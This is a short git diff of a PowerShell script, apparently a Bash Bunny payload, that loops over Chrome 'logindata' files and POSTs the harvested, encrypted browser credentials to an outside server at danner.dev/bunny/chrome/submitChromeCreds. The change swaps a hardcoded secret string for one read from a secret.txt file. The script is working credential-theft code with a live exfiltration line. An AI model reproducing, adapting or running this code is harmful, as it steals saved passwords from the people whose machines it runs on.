@@ -31,6 +31,7 @@ foreach ($path in $paths) { # iterate through each logindata (if there are more 
 	}
 	Remove-Item $backup
 }
-$encryptedData = ,"N&hm2$!J6C#fn98-wUds%9_uaCL8zYE%bGGUXJCkJUm@d" + $encryptedData
+$secret = Get-Content -Path ($source_path + "\secret.txt")
+$encryptedData = ,$secret + $encryptedData
 
 Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body ($encryptedData|ConvertTo-Json) -ContentType "application/json"
